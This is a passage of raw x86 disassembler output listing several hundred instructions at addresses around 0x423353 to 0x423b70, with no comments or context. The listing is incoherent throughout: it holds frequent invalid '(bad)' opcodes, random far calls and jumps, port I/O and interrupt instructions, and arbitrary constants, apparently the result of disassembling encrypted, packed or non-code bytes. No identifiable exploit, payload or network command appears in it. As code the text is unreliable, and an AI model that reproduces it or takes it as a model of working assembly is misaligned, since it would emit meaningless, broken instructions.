  423353:	push   0x3932c794
  423358:	mov    ebp,0xd4bc32d5
  42335d:	jge    0x423322
  42335f:	enter  0xcf35,0xa1
  423363:	inc    edx
  423364:	data16 sbb bh,BYTE PTR ds:0x58bd962
  42336b:	or     eax,0xe4870ad5
  423370:	clc    
  423371:	(bad)  
  423372:	push   eax
  423373:	lds    edi,FWORD PTR [edi+eiz*1-0x24]
  423377:	push   esp
  423378:	mov    ebx,0x14a44b3b
  42337d:	test   BYTE PTR [eax-0x62],ah
  423380:	push   ss
  423381:	leave  
  423382:	les    ebx,FWORD PTR [ecx+0x46]
  423385:	dec    edi
  423386:	mov    dl,0x1b
  423388:	cld    
  423389:	dec    ebp
  42338a:	fldcw  WORD PTR es:[ecx]
  42338d:	cmc    
  42338e:	jge    0x4233c8
  423390:	or     al,ch
  423392:	xchg   esp,eax
  423393:	popa   
  423394:	stos   DWORD PTR es:[edi],eax
  423395:	daa    
  423396:	sbb    al,0x73
  423398:	adc    eax,0x60838adb
  42339d:	sbb    dh,bl
  42339f:	sahf   
  4233a0:	mov    ch,0x7a
  4233a2:	dec    eax
  4233a3:	jg     0x423400
  4233a5:	jne    0x42341c
  4233a7:	xchg   edx,eax
  4233a8:	inc    ebx
  4233a9:	cmp    eax,0x6819da13
  4233ae:	les    esp,FWORD PTR [ecx]
  4233b0:	(bad)  
  4233b1:	das    
  4233b2:	pop    esp
  4233b3:	jg     0x4233ea
  4233b5:	(bad)  
  4233b6:	sbb    dl,al
  4233b8:	js     0x42339d
  4233ba:	gs or  ecx,esp
  4233bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233be:	rcl    DWORD PTR [edi],0x83
  4233c1:	lock add ebp,DWORD PTR [eax]
  4233c4:	pop    ss
  4233c5:	adc    eax,0x8a630fd9
  4233ca:	repz sbb BYTE PTR [esi+0x1f],0xe8
  4233cf:	pop    ss
  4233d0:	inc    esp
  4233d1:	xor    bh,BYTE PTR [eax]
  4233d3:	inc    esi
  4233d4:	sbb    bh,0x15
  4233d7:	movhps xmm4,QWORD PTR [eax-0x15]
  4233db:	sub    DWORD PTR [eax],esp
  4233dd:	cmc    
  4233de:	fidivr DWORD PTR [ebp+eiz*1-0x2e73fdbf]
  4233e5:	mov    ah,0x74
  4233e7:	add    al,dh
  4233e9:	mov    DWORD PTR [ecx+edi*1-0x4f],esi
  4233ed:	cmp    eax,0xf960d484
  4233f2:	addr16 out 0xe0,al
  4233f5:	loope  0x423464
  4233f7:	sbb    al,BYTE PTR ss:[esp+ebp*8]
  4233fb:	sbb    DWORD PTR [esp+ecx*8+0x3ed37d0e],eax
  423402:	daa    
  423403:	stos   BYTE PTR es:[edi],al
  423404:	shr    BYTE PTR [edx+eiz*8+0x76860c15],0xbe
  42340c:	retf   0xb920
  42340f:	int    0x63
  423411:	pop    ebp
  423412:	fisub  WORD PTR [esi+0x6c]
  423415:	jl     0x4233e7
  423417:	shr    BYTE PTR [edi-0x54577e40],0x85
  42341e:	pop    eax
  42341f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423420:	ror    edi,1
  423422:	and    eax,0x712bc19c
  423427:	cmc    
  423428:	stc    
  423429:	test   eax,0xfad1c2fe
  42342e:	add    esp,DWORD PTR [ebx+eiz*4]
  423431:	jnp    0x4233e6
  423433:	adc    edi,esi
  423435:	jge    0x42348b
  423437:	jle    0x42342e
  423439:	outs   dx,BYTE PTR ds:[esi]
  42343a:	adc    al,0x31
  42343c:	sbb    edx,0x465dc750
  423442:	inc    esp
  423444:	dec    ebx
  423445:	push   es
  423446:	add    al,0xfb
  423448:	lds    esi,FWORD PTR [ecx+0x72]
  42344b:	inc    ebp
  42344c:	cmp    dl,BYTE PTR [esi]
  42344e:	mov    al,ds:0x8016df8
  423453:	push   eax
  423454:	mov    esi,0x50ca4936
  423459:	retf   
  42345a:	mov    edx,DWORD PTR [ecx]
  42345c:	int3   
  42345d:	pop    edi
  42345e:	xlat   BYTE PTR ds:[bx]
  423460:	dec    ebx
  423461:	outs   dx,BYTE PTR ds:[esi]
  423462:	int    0xe7
  423464:	dec    edx
  423465:	xor    dh,BYTE PTR [esp+edx*4]
  423468:	fimul  DWORD PTR [edx-0x31]
  42346b:	push   cs
  42346c:	xor    ebx,DWORD PTR [ebx]
  42346e:	mov    ch,0xa
  423470:	add    BYTE PTR [ebx+0x61674de9],cl
  423476:	call   0xdf15:0xf832e860
  42347d:	cmp    DWORD PTR [edx],edx
  42347f:	dec    eax
  423480:	pop    es
  423481:	push   ebp
  423482:	daa    
  423483:	lock dec ecx
  423485:	out    dx,eax
  423486:	xlat   BYTE PTR ds:[ebx]
  423487:	mov    WORD PTR [ebx-0x28526417],es
  42348d:	addr16 push edi
  42348f:	stos   DWORD PTR es:[edi],eax
  423490:	pop    edx
  423491:	mov    edx,0xab2b8c23
  423496:	sub    BYTE PTR fs:[edi-0x2006421c],0x1e
  42349e:	mov    ds:0x87daf979,al
  4234a3:	and    al,0x88
  4234a5:	(bad)  
  4234a6:	and    eax,0x6876f1c2
  4234ab:	loopne 0x4234e3
  4234ad:	dec    edi
  4234ae:	aas    
  4234af:	push   es
  4234b0:	sbb    dh,dh
  4234b2:	ror    eax,0x6d
  4234b5:	mov    ch,0x4
  4234b7:	jne    0x4234e5
  4234b9:	(bad)  
  4234bb:	or     edi,DWORD PTR [ebx+0x4d49fbb1]
  4234c1:	lods   eax,DWORD PTR ds:[esi]
  4234c2:	loope  0x42344b
  4234c4:	outs   dx,BYTE PTR ds:[esi]
  4234c5:	enter  0x4ddd,0xf9
  4234c9:	loope  0x42353a
  4234cb:	and    ah,BYTE PTR [ecx+0x47]
  4234ce:	lds    edi,FWORD PTR [ecx]
  4234d0:	clc    
  4234d1:	mov    ecx,DWORD PTR [eax-0x38523718]
  4234d7:	into   
  4234d8:	add    DWORD PTR [ebp-0x5b],ecx
  4234db:	inc    edx
  4234dc:	mov    ebp,0xf1aa11d
  4234e1:	out    dx,eax
  4234e2:	fisubr DWORD PTR [edi-0x4c]
  4234e5:	les    ebp,FWORD PTR [esi-0x61914048]
  4234eb:	jb     0x423471
  4234ed:	cmc    
  4234ee:	test   BYTE PTR [esi-0x663c8807],dh
  4234f4:	jmp    FWORD PTR ds:0x4da65f34
  4234fa:	(bad)  
  4234fc:	idiv   al
  4234fe:	test   al,0x8b
  423500:	cmp    esi,eax
  423502:	mov    cl,0x45
  423504:	push   esp
  423505:	xchg   esi,eax
  423506:	fcom   QWORD PTR [ecx]
  423508:	mov    esp,0xff50c997
  42350d:	test   BYTE PTR [ebp+edi*2-0x3775eb72],al
  423514:	loop   0x42354e
  423516:	adc    DWORD PTR [ebx],edi
  423518:	gs icebp 
  42351a:	push   edx
  42351b:	inc    ebx
  42351c:	push   edi
  42351d:	or     al,0xd
  42351f:	sub    DWORD PTR [edx-0x49],0xffffff9e
  423523:	xchg   BYTE PTR [ebp+ebx*8+0x7e],ch
  423527:	inc    ebp
  423528:	xor    eax,DWORD PTR [ebp+0x54]
  42352b:	mov    ds,WORD PTR [ebx]
  42352d:	sar    DWORD PTR [ebx-0x60654fa5],1
  423533:	scas   eax,DWORD PTR es:[edi]
  423534:	mov    BYTE PTR [edx-0xaa8d4a0],0x7c
  42353b:	add    al,0xd2
  42353d:	cmp    dh,BYTE PTR [edi+0x773cf89c]
  423543:	xor    BYTE PTR [edx+0x767a9051],al
  423549:	add    DWORD PTR [edx-0x50],0x44
  42354d:	int3   
  42354e:	enter  0x71d,0xcb
  423552:	adc    BYTE PTR [edx*1+0x74c04db5],dl
  423559:	frstor [edi]
  42355b:	ins    DWORD PTR es:[edi],dx
  42355c:	sbb    WORD PTR [edx+ebx*8],bx
  423560:	rcr    DWORD PTR [ecx],cl
  423562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423563:	es jecxz 0x423535
  423566:	scas   al,BYTE PTR es:[edi]
  423567:	and    al,0x23
  423569:	push   edi
  42356a:	ret    
  42356b:	addr16 imul eax,ebx,0x8e73353d
  423572:	(bad)  
  423573:	or     edi,edx
  423575:	push   ecx
  423576:	rcr    BYTE PTR [edx-0x76],1
  423579:	sbb    BYTE PTR [eax+0x7],cl
  42357c:	sbb    DWORD PTR [ebp+0x69],ecx
  42357f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423580:	mov    ds:0xe96941e8,al
  423585:	mov    esp,0x1049e82
  42358a:	out    dx,al
  42358b:	call   0x4305146a
  423590:	mov    cl,0xf3
  423592:	and    al,0x1c
  423594:	rcr    edi,0x84
  423597:	or     dl,BYTE PTR [ecx]
  423599:	ja     0x42359f
  42359b:	adc    al,0xfb
  42359d:	sbb    ebp,edx
  42359f:	inc    eax
  4235a0:	icebp  
  4235a1:	mov    edi,0xa54d2f17
  4235a7:	stc    
  4235a8:	mov    esp,0x15a45ee3
  4235ad:	jl     0x423594
  4235af:	mov    al,0xba
  4235b1:	(bad)  
  4235b2:	xor    cl,ch
  4235b4:	imul   ebx,DWORD PTR [ebx],0x4e
  4235b7:	dec    edi
  4235b8:	mov    bh,BYTE PTR [edx]
  4235ba:	push   ebp
  4235bb:	jo     0x4235f5
  4235bd:	fsubrp st(2),st
  4235bf:	adc    ebx,ebx
  4235c1:	and    al,0x41
  4235c3:	adc    dl,al
  4235c5:	cmp    BYTE PTR [ebx-0x40111762],ah
  4235cb:	cld    
  4235cc:	xchg   ecx,eax
  4235cd:	fbld   TBYTE PTR [ebp+edx*8+0x2f]
  4235d1:	stos   BYTE PTR es:[edi],al
  4235d2:	push   esp
  4235d3:	enter  0x983d,0xe2
  4235d7:	out    0x57,al
  4235d9:	pop    es
  4235da:	sti    
  4235db:	ins    DWORD PTR es:[edi],dx
  4235dc:	inc    ebp
  4235dd:	and    dh,bl
  4235df:	mov    dh,0xd6
  4235e1:	inc    ebx
  4235e2:	enter  0x33d,0xdc
  4235e6:	shl    BYTE PTR [eax-0x6714fa57],cl
  4235ec:	push   edx
  4235ed:	sbb    al,0xd6
  4235ef:	mov    edx,0xbabd826e
  4235f4:	sti    
  4235f5:	jo     0x423579
  4235f7:	stos   BYTE PTR es:[edi],al
  4235f8:	pop    ds
  4235f9:	je     0x4235d2
  4235fb:	cmc    
  4235fc:	mov    al,0xba
  4235fe:	shl    BYTE PTR [ebx+0x7b],cl
  423601:	fwait
  423602:	and    cl,BYTE PTR ds:0x2a9d8050
  423608:	icebp  
  423609:	lods   al,BYTE PTR ds:[esi]
  42360a:	imul   esp,DWORD PTR [edi],0x87815733
  423610:	mov    es,WORD PTR [ebp-0x6604360f]
  423616:	mov    esi,0x1099fcc9
  42361b:	out    0x7e,al
  42361d:	and    cl,bh
  42361f:	push   0xa9e5cac5
  423624:	and    al,0xfa
  423626:	ins    DWORD PTR es:[edi],dx
  423627:	jae    0x4235c7
  423629:	mov    esi,0x9beac2dd
  42362e:	inc    eax
  42362f:	sti    
  423630:	jl     0x4235d8
  423632:	mov    esi,0x665018a0
  423637:	sbb    bl,0xf8
  42363a:	mov    BYTE PTR [edx-0x22],0xa1
  42363e:	pop    ds
  42363f:	pop    ebx
  423640:	int    0xa8
  423642:	sahf   
  423643:	(bad)  [edi+0x40]
  423646:	mov    ?,WORD PTR [ebx]
  423648:	test   al,0x46
  42364a:	mov    bl,0xc6
  42364c:	adc    eax,0xc836ba3a
  423651:	es aaa 
  423653:	xor    ah,bh
  423655:	push   0xffffffe4
  423657:	mov    WORD PTR [edi],cs
  423659:	mov    al,ds:0x554d66d5
  42365e:	add    BYTE PTR [esi],al
  423660:	jmp    0x4236d7
  423662:	adc    dl,BYTE PTR [ecx-0x1729c71d]
  423668:	pop    edi
  423669:	mov    WORD PTR [ecx],cs
  42366b:	popa   
  42366c:	jno    0x42367e
  42366e:	dec    ecx
  42366f:	push   eax
  423670:	test   eax,ecx
  423672:	cmp    al,0x56
  423674:	pop    edi
  423675:	mov    DWORD PTR [eax+ebp*2-0x19],ebp
  423679:	jmp    0x423620
  42367b:	sbb    BYTE PTR ds:0xd23fc015,ah
  423681:	fs in  eax,dx
  423683:	cmp    DWORD PTR [ebp-0x61a4da26],edx
  423689:	ror    BYTE PTR [edx+0xbcdd73f],1
  42368f:	cmp    BYTE PTR [ebp+0x23263b09],ah
  423695:	xchg   DWORD PTR [esi+0x74c42f8b],esi
  42369b:	popf   
  42369c:	or     ebx,DWORD PTR es:[esp+edi*8]
  4236a0:	mov    ds:0x707e33a6,eax
  4236a5:	push   ds
  4236a6:	mov    edi,0x795e6f8
  4236ab:	push   ebp
  4236ac:	std    
  4236ad:	daa    
  4236ae:	mov    esp,0x2e2b8d63
  4236b3:	inc    edx
  4236b4:	sahf   
  4236b5:	(bad)  
  4236b6:	fidiv  DWORD PTR [edx]
  4236b8:	aam    0x5c
  4236ba:	mov    ch,0x48
  4236bc:	lods   eax,DWORD PTR ds:[esi]
  4236bd:	mov    DWORD PTR ds:0x16a8a061,esp
  4236c3:	mov    eax,ds:0x7830b598
  4236c8:	fidivr DWORD PTR [ecx+0x5befe8d7]
  4236ce:	mul    BYTE PTR [esi-0x15]
  4236d1:	aaa    
  4236d2:	mov    al,ds:0xca6eeb6d
  4236d7:	dec    esp
  4236d8:	cmc    
  4236d9:	sti    
  4236da:	fistp  DWORD PTR [ecx]
  4236dc:	int3   
  4236dd:	jl     0x42370f
  4236df:	dec    ebx
  4236e0:	mov    dl,0xae
  4236e2:	xchg   DWORD PTR [edx+edi*1+0x3d2a0af1],edx
  4236e9:	xor    eax,0xee693018
  4236ef:	mov    edx,0x620daaa6
  4236f4:	pop    edx
  4236f5:	enter  0xdd44,0x22
  4236f9:	mov    al,ds:0xef9d2e16
  4236fe:	es aam 0x4e
  423701:	cmp    cl,BYTE PTR [esi-0x3b]
  423704:	les    ebp,FWORD PTR [eax+0x2d]
  423707:	add    dl,bh
  423709:	fwait
  42370a:	xchg   ebx,eax
  42370b:	fldenv [ebx+eax*2+0xc]
  42370f:	mov    eax,ds:0x940bdf3c
  423714:	mov    bh,0x1c
  423716:	inc    esi
  423717:	fucom  st(7)
  423719:	shr    BYTE PTR [eax+0x4bb45488],1
  42371f:	xchg   edx,eax
  423720:	cwde   
  423721:	nop
  423722:	pop    ebp
  423723:	cmp    BYTE PTR [eax],al
  423725:	sbb    bl,BYTE PTR [ecx+0x3994c7fd]
  42372b:	or     BYTE PTR [ebx],al
  42372d:	cs ss out dx,eax
  423730:	adc    esp,DWORD PTR ds:0xc88b115a
  423736:	and    dl,BYTE PTR [edi-0x4cb0ef2a]
  42373c:	retf   
  42373d:	popa   
  42373e:	mov    edi,0xe431a46
  423743:	ins    BYTE PTR es:[edi],dx
  423744:	xor    ch,bh
  423746:	adc    BYTE PTR [edi+0x29],al
  423749:	fisttp DWORD PTR [ecx+0x67ca26bb]
  42374f:	mov    ch,0x15
  423751:	sahf   
  423752:	js     0x423750
  423754:	rcr    BYTE PTR [ebx-0x404e1f53],cl
  42375a:	mov    ds:0x4e2bd573,eax
  42375f:	xor    eax,0xaf8cd74c
  423764:	loopne 0x4236f6
  423766:	das    
  423767:	or     BYTE PTR cs:[ecx+eax*1-0x53fa4cc6],al
  42376f:	in     eax,0x98
  423771:	pop    edx
  423772:	mov    dh,0x10
  423774:	mov    eax,ds:0xd18929f0
  423779:	push   esi
  42377a:	cwde   
  42377b:	sub    bh,BYTE PTR [esi+0x6]
  42377e:	sub    ebx,edx
  423780:	dec    ebx
  423781:	shr    BYTE PTR ss:[ebx-0x7d],cl
  423785:	in     eax,dx
  423786:	pop    esi
  423787:	add    DWORD PTR ds:0x1a11f1ad,ecx
  42378d:	mov    ecx,0x5c827455
  423792:	fs inc esi
  423794:	add    DWORD PTR [ebp-0x552bf47a],edi
  42379a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42379b:	nop
  42379c:	stos   BYTE PTR es:[edi],al
  42379d:	outs   dx,WORD PTR ds:[esi]
  42379f:	pushf  
  4237a0:	push   eax
  4237a1:	(bad)  
  4237a2:	mov    ah,0xa6
  4237a4:	cmc    
  4237a5:	inc    DWORD PTR [edx+0x31]
  4237a8:	cwde   
  4237a9:	sbb    eax,0xf1cf79be
  4237ae:	jb     0x4237c0
  4237b0:	repz sar DWORD PTR [ecx],1
  4237b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237b4:	sahf   
  4237b5:	inc    ecx
  4237b6:	dec    ebp
  4237b7:	add    esp,DWORD PTR [esi]
  4237b9:	int    0x79
  4237bb:	enter  0x7365,0xe4
  4237bf:	in     eax,dx
  4237c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237c1:	popa   
  4237c2:	mov    ?,edx
  4237c4:	xchg   dl,bh
  4237c6:	or     eax,0x1813a530
  4237cb:	dec    ebx
  4237cc:	sahf   
  4237cd:	dec    ecx
  4237ce:	mov    al,BYTE PTR [ecx]
  4237d0:	cmp    DWORD PTR [ebx+0x36],esi
  4237d3:	fdivrp st(6),st
  4237d5:	mov    eax,ecx
  4237d7:	out    dx,al
  4237d8:	arpl   WORD PTR [edx-0x5e49804b],bp
  4237de:	jmp    0x2cf8b66b
  4237e3:	stos   BYTE PTR es:[edi],al
  4237e4:	add    edx,DWORD PTR [eax+0x2d]
  4237e7:	hlt    
  4237e8:	and    DWORD PTR [ebp-0x59],ebx
  4237eb:	xchg   esp,edi
  4237ed:	xchg   ecx,eax
  4237ee:	or     edi,DWORD PTR [edx+0x3a]
  4237f1:	pop    esp
  4237f2:	adc    eax,0x2992fc33
  4237f7:	out    0xd4,al
  4237f9:	or     bh,BYTE PTR [edi]
  4237fb:	call   0xb0aa:0x55d03e90
  423802:	mov    ds:0x85949464,eax
  423808:	retf   
  423809:	nop
  42380a:	sub    dl,BYTE PTR gs:[eax]
  42380d:	out    dx,eax
  42380e:	cmp    edx,ebx
  423810:	jbe    0x42379f
  423812:	sar    BYTE PTR [edi-0x3818e7b7],1
  423818:	das    
  423819:	enter  0x647b,0x53
  42381d:	xchg   edx,eax
  42381e:	cmp    ebx,ebp
  423820:	jnp    0x4237b2
  423822:	data16 jg 0x4237cd
  423825:	outs   dx,BYTE PTR ds:[esi]
  423826:	adc    edi,ebx
  423828:	push   cs
  423829:	ins    DWORD PTR es:[edi],dx
  42382a:	arpl   WORD PTR [ecx+0x54],dx
  42382d:	ss out dx,al
  42382f:	jp     0x423873
  423831:	inc    ebp
  423832:	ins    BYTE PTR es:[edi],dx
  423833:	inc    ebx
  423834:	or     esi,ecx
  423836:	das    
  423837:	jle    0x4237df
  423839:	xchg   DWORD PTR [ebx+0x16],esp
  42383c:	inc    edi
  42383d:	push   esp
  42383e:	inc    ebx
  42383f:	cmp    esi,ebx
  423841:	xchg   ecx,eax
  423842:	fs mov ch,0x4c
  423845:	nop
  423846:	ret    
  423847:	lea    esi,[esi-0x3546fc32]
  42384d:	das    
  42384e:	pusha  
  42384f:	ret    0xcd59
  423852:	inc    eax
  423853:	mov    dl,0x21
  423855:	sahf   
  423856:	jo     0x4238d5
  423858:	int3   
  423859:	int3   
  42385a:	popa   
  42385b:	fmul   QWORD PTR [edi+0xb36b056]
  423861:	and    edx,edx
  423863:	out    dx,eax
  423864:	fiadd  DWORD PTR [edi]
  423866:	jecxz  0x42383f
  423868:	xlat   BYTE PTR ds:[ebx]
  423869:	sbb    bh,0x2
  42386c:	out    dx,al
  42386d:	adc    edx,0x22
  423870:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423871:	js     0x42380f
  423873:	dec    edi
  423874:	and    BYTE PTR [edx-0x2a],bl
  423877:	nop
  423878:	js     0x4238cc
  42387a:	mov    ?,edi
  42387c:	mov    edi,edx
  42387e:	xchg   BYTE PTR [ebp+ecx*1-0x65],cl
  423882:	mov    al,0xe7
  423884:	add    eax,0xc8f34b8e
  423889:	sti    
  42388a:	sahf   
  42388b:	dec    ebp
  42388c:	fist   DWORD PTR [ebp+0x64552ddb]
  423892:	mov    eax,0xbed6e4c4
  423897:	sar    DWORD PTR [ebx+0x63],1
  42389a:	aas    
  42389b:	jmp    0xe485:0x12ac5aba
  4238a2:	aam    0xc0
  4238a4:	xor    BYTE PTR [edx+0x5a58df29],bh
  4238aa:	pushf  
  4238ab:	fidivr DWORD PTR [esi]
  4238ad:	adc    DWORD PTR [esi+0x31fa1335],edx
  4238b3:	and    DWORD PTR [edi+0xc475236],eax
  4238b9:	sbb    ah,BYTE PTR [edx+0x63]
  4238bc:	xchg   edx,eax
  4238bd:	add    DWORD PTR [esi],ecx
  4238bf:	mov    DWORD PTR ds:0xca8c3710,edi
  4238c5:	jl     0x423909
  4238c7:	retf   0x9708
  4238ca:	xchg   ecx,eax
  4238cb:	cli    
  4238cc:	jae    0x4238fa
  4238ce:	lahf   
  4238cf:	test   DWORD PTR [edx-0x76],eax
  4238d2:	not    bl
  4238d4:	lds    ebp,FWORD PTR [edx-0x16]
  4238d7:	sbb    al,0x90
  4238d9:	sahf   
  4238da:	or     al,0xea
  4238dc:	fwait
  4238dd:	pop    edx
  4238de:	fdiv   QWORD PTR [eax]
  4238e0:	xor    BYTE PTR [eax-0x1b266456],bh
  4238e6:	xchg   ecx,ebx
  4238e8:	and    ebp,0xfea6b4c4
  4238ee:	loope  0x42393f
  4238f0:	dec    ebx
  4238f1:	test   BYTE PTR [eax+0x5b],0x2a
  4238f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238f6:	add    dl,BYTE PTR [edi-0x16]
  4238f9:	sbb    eax,0xee755c25
  4238fe:	inc    eax
  4238ff:	pop    ebp
  423900:	clc    
  423901:	es ins DWORD PTR es:[edi],dx
  423903:	scas   al,BYTE PTR es:[edi]
  423904:	push   edi
  423905:	stc    
  423906:	xchg   esi,eax
  423907:	ds std 
  423909:	daa    
  42390a:	mov    ch,0x74
  42390c:	dec    ebx
  42390d:	cmp    BYTE PTR [edx],0x53
  423910:	(bad)
  423915:	leave  
  423916:	je     0x42394a
  423918:	pop    edx
  423919:	mov    ebp,0xe92c6774
  42391e:	iret   
  42391f:	jno    0x423911
  423921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423922:	xor    DWORD PTR [ebp+0x6dedd0eb],0xaaf70610
  42392c:	dec    ebp
  42392d:	add    al,0x64
  42392f:	imul   esp,esp,0xffffffeb
  423932:	mov    esp,0x5650389f
  423937:	sbb    ch,bl
  423939:	int3   
  42393a:	fnsave [esi+edi*4-0x77c494d]
  423941:	imul   ebx,DWORD PTR [edx-0x5e],0xd1e564e3
  423948:	mov    esi,0x397a66c1
  42394d:	mov    edi,0xef56ed8c
  423952:	sbb    eax,0xf35cb099
  423957:	daa    
  423958:	mov    esi,ebp
  42395a:	dec    edx
  42395b:	sub    DWORD PTR [ebx],ecx
  42395d:	dec    edx
  42395e:	xor    DWORD PTR [esi],ecx
  423960:	aas    
  423961:	call   FWORD PTR [ebx+eiz*1+0x70]
  423965:	mov    edi,0x25e9080b
  42396a:	ficom  WORD PTR [edx-0x60]
  42396d:	iret   
  42396e:	dec    esi
  42396f:	sbb    ebx,DWORD PTR [bp+si+0x1768]
  423974:	aaa    
  423975:	dec    esi
  423976:	pushf  
  423977:	sbb    bh,BYTE PTR [edi-0x6bd0f990]
  42397d:	sbb    ecx,DWORD PTR [edi+0x0]
	...
  4239bf:	add    BYTE PTR [eax],al
  4239c1:	add    ch,dl
  4239c3:	and    BYTE PTR [eax-0x4],0x75
  4239c7:	cld    
  4239c8:	(bad)  [ecx+0x32bc8e94]
  4239ce:	loope  0x4239d1
  4239d0:	out    dx,al
  4239d1:	xchg   esi,eax
  4239d2:	pop    es
  4239d3:	and    al,BYTE PTR [ecx]
  4239d5:	add    BYTE PTR ds:0x30000007,ah
  4239db:	adc    DWORD PTR [eax],ebx
  4239dd:	push   edi
  4239de:	sbb    eax,0xecd1f3f1
  4239e3:	dec    ecx
  4239e4:	gs in  eax,dx
  4239e6:	sbb    cl,BYTE PTR [eax+0x69233693]
  4239ec:	(bad)  
  4239ed:	aaa    
  4239ee:	mov    dh,0xd1
  4239f0:	mul    BYTE PTR [ecx]
  4239f2:	bound  esp,QWORD PTR [ebp-0x41]
  4239f5:	xor    edx,esi
  4239f7:	adc    eax,ebx
  4239f9:	test   al,al
  4239fb:	adc    eax,0x8843346c
  423a00:	cmp    dh,bh
  423a02:	xchg   ebp,eax
  423a03:	aam    0x58
  423a05:	(bad)  
  423a07:	test   eax,0xb49a0184
  423a0c:	test   eax,0xa4261463
  423a11:	jmp    0x423a89
  423a13:	addr16 inc ecx
  423a15:	pop    ds
  423a16:	dec    ecx
  423a17:	push   ecx
  423a18:	aas    
  423a19:	lock or DWORD PTR [edi],ecx
  423a1c:	sbb    al,0x21
  423a1e:	mov    dh,0x2c
  423a20:	jecxz  0x423a8b
  423a22:	xchg   esi,eax
  423a23:	rol    al,0xf4
  423a26:	sub    al,0x46
  423a28:	cwde   
  423a29:	and    al,0x82
  423a2b:	pop    ds
  423a2c:	pop    ebp
  423a2d:	pop    edi
  423a2e:	jp     0x423a49
  423a30:	ins    BYTE PTR es:[edi],dx
  423a31:	and    al,0x2d
  423a33:	inc    ebp
  423a34:	jmp    0x423a11
  423a36:	(bad)  
  423a37:	cs jle 0x423a99
  423a3a:	jns    0x423a48
  423a3c:	retf   0x86d7
  423a3f:	fs push esp
  423a41:	ja     0x423a83
  423a43:	aas    
  423a44:	dec    esi
  423a45:	je     0x423a17
  423a47:	mov    ebp,0xc18f877
  423a4c:	call   0x34f6:0xfb689a9e
  423a53:	cmp    BYTE PTR [edx+0x7ac9e75],bl
  423a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a5a:	dec    ecx
  423a5b:	sbb    al,0xb4
  423a5d:	add    esi,DWORD PTR [ebx+0x596bd6c4]
  423a63:	push   es
  423a64:	mov    edx,0x16321971
  423a69:	call   0xfeba:0x3169e219
  423a70:	lods   al,BYTE PTR ds:[esi]
  423a71:	mov    DWORD PTR [esi],edi
  423a73:	test   eax,0xc6bd638
  423a78:	or     bh,BYTE PTR [edx]
  423a7a:	add    BYTE PTR [eax+ebx*4+0x1250e477],al
  423a81:	xchg   DWORD PTR [eax-0x2f],esp
  423a84:	jo     0x423a1b
  423a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a87:	adc    al,0x7e
  423a89:	sub    ebx,edi
  423a8b:	mov    WORD PTR [ebx],fs
  423a8d:	dec    ch
  423a8f:	lds    edi,FWORD PTR [edi+0x6b]
  423a92:	js     0x423a96
  423a94:	shr    BYTE PTR [edx+0x5e937fdf],1
  423a9a:	lock into 
  423a9c:	call   0xcd08e8c0
  423aa1:	push   edx
  423aa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423aa3:	test   eax,0x330faaff
  423aa8:	popf   
  423aa9:	pop    ss
  423aaa:	xchg   esp,eax
  423aab:	push   esi
  423aac:	push   es
  423aad:	div    DWORD PTR [esi+0x1535abca]
  423ab3:	imul   eax,DWORD PTR [edi+0x64],0x6a7768ab
  423aba:	int    0x15
  423abc:	inc    eax
  423abd:	adc    BYTE PTR [edx+eiz*1+0x6f17bef5],0xf3
  423ac5:	dec    ebp
  423ac6:	out    dx,eax
  423ac7:	mul    dl
  423ac9:	retw   
  423acb:	mov    cl,0xfb
  423acd:	fdiv   QWORD PTR [edi-0x585418ac]
  423ad3:	frstor [ebx+0x9]
  423ad6:	gs mov ebp,0x7dce176e
  423adc:	loop   0x423b45
  423ade:	cwde   
  423adf:	sbb    al,0xab
  423ae1:	mov    eax,0x258be37b
  423ae6:	lock dec edi
  423ae8:	shl    ebp,cl
  423aea:	pushf  
  423aeb:	sub    BYTE PTR [edx-0x68a78181],0xa0
  423af2:	nop
  423af3:	aad    0x95
  423af5:	xchg   edi,eax
  423af6:	rcr    cl,cl
  423af8:	nop
  423af9:	jecxz  0x423a81
  423afb:	repnz mov ds:0x409c88d5,al
  423b01:	ret    
  423b02:	mov    BYTE PTR [ecx],ah
  423b04:	and    esp,DWORD PTR [edi]
  423b06:	aad    0x50
  423b08:	lds    edi,FWORD PTR [eax+0x3a0848bb]
  423b0e:	jp     0x423b72
  423b10:	sbb    cl,BYTE PTR [esp+eax*2+0x38]
  423b14:	pop    ss
  423b15:	sub    al,0x63
  423b17:	pop    es
  423b18:	jo     0x423aa9
  423b1a:	inc    esi
  423b1b:	pushf  
  423b1c:	xor    ch,BYTE PTR [eax+edx*4-0x39]
  423b20:	dec    eax
  423b21:	cld    
  423b22:	push   ss
  423b23:	or     edx,edi
  423b25:	xor    DWORD PTR [ecx],eax
  423b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b28:	dec    edi
  423b29:	out    0x1f,eax
  423b2b:	sbb    eax,0x37bd46ef
  423b30:	jecxz  0x423ba3
  423b32:	dec    ebx
  423b33:	arpl   WORD PTR [ebp+0x2a],di
  423b36:	mov    ecx,0xdc8047ac
  423b3b:	leave  
  423b3c:	dec    ecx
  423b3d:	fst    QWORD PTR [esi-0x2f]
  423b40:	sbb    esi,DWORD PTR [esi-0x589be6ab]
  423b46:	nop
  423b47:	and    ch,bh
  423b49:	and    esp,0x5da4e482
  423b4f:	xor    esi,DWORD PTR [esi-0x5ad9add8]
  423b55:	sbb    dl,BYTE PTR [eax]
  423b57:	rcr    BYTE PTR [eax-0x27],cl
  423b5a:	lods   eax,DWORD PTR ds:[esi]
  423b5b:	call   0x1e46fbc9
  423b60:	(bad)  
  423b61:	out    dx,eax
  423b62:	icebp  
  423b63:	jne    0x423afb
  423b65:	sub    BYTE PTR [edx],bh
  423b67:	sar    ecx,1
  423b69:	sbb    DWORD PTR [edx+0x50ef18cb],eax
  423b6f:	stc    
  423b70:	mov    ebx,0x940a135
